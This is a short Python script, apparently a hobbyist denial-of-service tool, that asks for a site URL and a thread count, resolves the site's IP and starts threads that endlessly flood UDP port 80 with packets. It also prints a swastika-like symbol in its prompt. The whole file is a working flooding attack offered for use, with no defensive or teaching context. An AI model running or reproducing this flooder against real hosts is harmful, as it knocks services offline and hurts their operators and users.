import time
import socket
import sys
import _thread
from colorama import Fore
from modules import main
main.banner()
main.ddos_main()
main_ = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"irnofoz"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"DDOS"+Fore.RED+"/"+Fore.LIGHTYELLOW_EX+"Start"+Fore.RED+"/"+Fore.GREEN+"....."+Fore.RED+"""]
 └──╼ 卐 """).lower()
if main_ == "1":
    site = input("site url => ")
    thread_count = input("te dad hamle ha => ")

    ip = socket.gethostbyname(site)

    UDP_PORT = 80
    MESSAGE = "Miltone"
    print("IP:", ip)
    print("port:", UDP_PORT)
    time.sleep(3)

    def ddos(i):
        while 1:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
            print(Fore.GREEN + "Poket ersal shod\n")

    for i in range(int(thread_count)):
        try:
            _thread.start_new_thread(ddos, ("Thread-" + str(i),))
        except KeyboardInterrupt:
            sys.exit(0)

    while 1:
        pass
